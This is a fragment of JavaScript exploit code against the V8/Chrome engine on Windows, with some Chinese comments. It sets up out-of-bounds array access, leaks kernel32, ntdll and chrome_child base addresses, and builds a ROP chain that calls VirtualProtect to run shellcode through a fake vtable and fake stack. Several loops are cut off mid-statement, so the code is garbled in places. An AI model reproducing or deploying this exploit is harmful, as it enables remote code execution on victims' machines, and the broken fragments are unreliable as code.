        // this = a & b
        this.assignAnd = operation(function and(a, b) {
            for (var i = 0; i >> 0;
        //b = b >>> 0;
        //console.log(a.toString());
        //console.log(b.toString());
        return parseInt(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), 16);
    }
    //padLeft用于字符串左补位
    function combineint(a, b) {
        //a = a >>> 0;
        //b = b >>> 0;
        return parseInt(b.toString(16).substr(-8,8) + (a.toString(16)).padLeft(8), 16);
    }
    function gc(){
      for (var i = 0; i > 16
        a1[x * 19] = 2.60750842793813e-310;  // 0xffff00000000
        a1[x * 21] = 2.60750842793813e-310;  // 0x2a00000000
        a1[x * 41] = 2.60750842793813e-310;  // 0x2a00000000
    }
    var a1, oob_double_Array, object_Array, oob_buffer;
    var a3 = [1.1,2.2];
    a3.length = 0x11000;
    a3.fill(3.3);
    var a4 = [1.1];
    for (let i = 0; i  x KERNEL32!*NtQueryEvent*
    ntdll_addr = readPtr(offset, kernel32_addr + new Int64(0x76fe8).asDouble()) - new Int64(0xa55d0).asDouble();;
    // alert("[+] the ntdll_addr is at " + Int64.fromDouble(ntdll_addr).toString());
    // gadget = ntdll_addr + new Int64(0xA0715).asDouble();
    gadget = ntdll_addr + new Int64(0xAB9B5).asDouble();
    // alert("[+] the gadget(mov     rdx, [rcx+50h]\n mov     rbp, [rcx+18h]\n mov     rsp, [rcx+10h]\n) is at " + Int64.fromDouble(gadget).toString());
    pop_rcx_ret = chrome_child_addr + new Int64(0x40982c).asDouble();
    // alert("[+] the pop_rcx_ret is at " + Int64.fromDouble(pop_rcx_ret).toString());
    pop_rdx_ret = chrome_child_addr + new Int64(0x12d91a).asDouble();
    // alert("[+] the pop_rdx_ret is at " + Int64.fromDouble(pop_rdx_ret).toString());
    pop_r8_ret = chrome_child_addr + new Int64(0x11b6012).asDouble();
    // alert("[+] the pop_r8_ret is at " + Int64.fromDouble(pop_r8_ret).toString());
    pop_r9_ret = chrome_child_addr + new Int64(0x197b44c).asDouble();
    // alert("[+] the pop_r9_ret is at " + Int64.fromDouble(pop_r9_ret).toString());
    // virtaulprotect_addr = kernel32_addr + new Int64(0x193d0).asDouble();
    virtaulprotect_addr = kernel32_addr + new Int64(0x1B330).asDouble();
    // alert("[+] the virtaulprotect_addr is at " + Int64.fromDouble(virtaulprotect_addr).toString());
    %DebugPrint(scratch);
    scratch_buffer_addr = user_space_read(scratch);
    // alert("[+] the scratch_buffer_addr is at " + Int64.fromDouble(scratch_buffer_addr).toString());
    let scratch_addr = readPtr(offset, scratch_buffer_addr + new Int64(0x1f).asDouble());
    // alert("[+] the scratch_addr is at " + Int64.fromDouble(scratch_addr).toString());
    sc_upper = upper(scratch_addr);
    sc_lower = lower(scratch_addr);
    scratch_addr1 = combineint(sc_upper, sc_lower);
    let sc_offset = 0x20000 - scratch_addr1 % 0x1000;
    // alert("[+] the sc_offset is at 0x" + sc_offset.toString(16));
    let sc_addr = scratch_addr + new Int64("0x" + sc_offset.toString(16)).asDouble();
    // alert("[+] the sc_addr is at " + Int64.fromDouble(sc_addr).toString());
    scratch_u8.set(shellcode, Number(sc_offset));
    scratch_u64.fill(gadget, 0, 100);
    let fake_vtab = scratch_addr;
    // alert("[+] the fake_vtab is at " + Int64.fromDouble(fake_vtab).toString());
    let fake_stack = scratch_addr + new Int64(0x10000).asDouble();
    let stack = [
        pop_rcx_ret,
        sc_addr,
        pop_rdx_ret,
        new Int64(0x1000).asDouble(),
        pop_r8_ret,
        new Int64(0x40).asDouble(),
        pop_r9_ret,
        scratch_addr,
        virtaulprotect_addr, // VirtualProtect
        sc_addr,
    ];
    for (let i = 0; i 